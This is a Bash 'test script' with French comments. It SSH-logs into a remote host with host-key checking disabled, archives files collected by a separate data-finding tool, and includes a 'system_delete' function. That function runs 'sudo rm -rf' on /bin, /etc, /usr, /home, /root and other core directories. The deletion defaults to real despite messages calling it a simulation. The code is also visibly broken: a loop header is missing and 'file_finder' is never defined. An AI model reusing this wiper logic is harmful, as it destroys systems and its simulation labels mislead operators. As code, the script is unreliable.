#!/bin/bash

set -euo pipefail  

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

section() {
    echo ""
    echo "========================================"
    echo "  $*"
    echo "========================================"
    echo ""
}

auto_login() {
    section "AUTO LOGIN"
    
    if [[ -z "${IP:-}" ]] || [[ -z "${NAME:-}" ]] || [[ -z "${PORT:-}" ]]; then
        log "[ERR] Missing connection parameters"
        log "Please set: IP, NAME, PORT"
        return 1
    fi
    
    if ! [[ $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        log "[ERR] Invalid IP address: $IP"
        return 1
    fi
    
    if ! [[ $PORT =~ ^[0-9]+$ ]] || [[ $PORT -lt 1 ]] || [[ $PORT -gt 65535 ]]; then
        log "[ERR] Invalid port: $PORT"
        return 1
    fi
    
    log "[INFO] Attempting connection to $NAME@$IP:$PORT"
    
    # Test de connexion
    if ssh -o ConnectTimeout=5 \
           -o BatchMode=yes \
           -o StrictHostKeyChecking=no \
           -o UserKnownHostsFile=/dev/null \
           -p "$PORT" "$NAME@$IP" "exit" 2>/dev/null; then
        
        log "[OK] Connection established successfully."
        
        # Session interactive
        log "[INFO] Opening interactive session..."
        ssh -p "$PORT" "$NAME@$IP"
        return 0
    else
        log "[ERR] Connection failed - check credentials or network"
        return 1
    fi
}


export_datas() {
    section "EXPORT DATAS"
    
    local export_dir="/tmp/export_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$export_dir"
    
    log "[INFO] Exporting data to $export_dir"
    
    # Copie des résultats
    if [[ -d "/tmp/datas_finder" ]]; then
        cp -r /tmp/datas_finder/* "$export_dir/" 2>/dev/null || true
    fi
    
    # Création d'un archive
    tar -czf "$export_dir/../export_$(date +%Y%m%d_%H%M%S).tar.gz" -C "$export_dir" . 2>/dev/null || true
    
    log "[OK] Export complete: $export_dir"
    
    # Afficher le contenu
    echo ""
    echo "📁 Exported files:"
    ls -la "$export_dir" 2>/dev/null || echo "  (empty)"
}


message_display() {
    section "MESSAGE DISPLAY"
    
    echo ""
    echo "📊 SCAN RESULTS SUMMARY"
    echo "========================"
    
    # Vérifier les résultats
    if [[ -f "/tmp/datas_finder/"*"/summary.txt" ]]; then
        cat /tmp/datas_finder/*/summary.txt 2>/dev/null || echo "No summary found"
    else
        echo "ℹ️  No results found yet"
        echo "   Run datas_finder.py first"
    fi
    
    echo ""
    echo "💡 Next steps:"
    echo "   1. Check /tmp/datas_finder for detailed results"
    echo "   2. Review interesting files found"
    echo "   3. Export data for analysis"
}


system_delete() {
    section "DELETE SYSTEM"
    echo ""
    
    # Mode terminal (si on veut ouvrir un terminal séparé)
    if [[ -z "$TERM" || "$TERM" == "dumb" ]]; then
        log "[INFO] Opening terminal on target machine"
        
        if command -v gnome-terminal >/dev/null 2>&1; then
            gnome-terminal -- bash -c "$0; read -p 'Press enter to close'"
            exit 0
        elif command -v xterm >/dev/null 2>&1; then
            xterm -e bash -c "$0; read -p 'Press enter to close'"
            exit 0
        else
            log "[WARN] No terminal found, continuing in current session"
        fi
    fi
    
    # ⚠️  DESTRUCTIVE CODE - À GARDER UNIQUEMENT POUR TESTS VM
    log "[WARN] STARTING SYSTEM DELETE - THIS WILL DESTROY DATA!"
    
    local dirs_to_delete="bin sbin lib lib64 etc opt usr var home root"

            
            log "[DELETE] Deleting /$dir..."
            
            echo "   Would delete: /$dir"
            
            if [[ "${REAL_DELETE:-1}" == "1" ]]; then
                sudo rm -rf "/$dir" 2>/dev/null || {
                    log "[ERR] Failed to delete /$dir"
                }
            fi
        fi
    done
    
    log "[INFO] Delete simulation complete"
    log "[INFO] Set REAL_DELETE=1 to actually delete files"
    
    # Avertissement final
    echo ""
    echo "⚠️  To actually delete files, run with:"
    echo "   REAL_DELETE=1 ./test.sh system_delete"
}

# ============================================
# 6. MAIN
# ============================================
main() {
    section "TEST SCRIPT START"
    
    log "[INFO] Starting test script"
    log "[INFO] PID: $$"
    log "[INFO] User: $(whoami)"
    log "[INFO] Host: $(hostname)"
    
    # Fonctions principales
    auto_login || {
        log "[ERR] Auto login failed"
        exit 1
    }
    
    file_finder
    export_datas
    message_display
    
    # La suppression est commentée par défaut - décommenter UNIQUEMENT pour les tests
    # system_delete
    
    section "TEST SCRIPT COMPLETE"
}

# ============================================
# EXÉCUTION
# ============================================

# Si un argument est passé, exécuter cette fonction directement
if [[ $# -gt 0 ]]; then
    case "$1" in
        auto_login|file_finder|export_datas|message_display|system_delete|main)
            "$1"
            ;;
        *)
            echo "Usage: $0 [function_name]"
            echo "Available: auto_login, file_finder, export_datas, message_display, system_delete, main"
            exit 1
            ;;
    esac
else
    # Exécution normale
    main "$@"
fi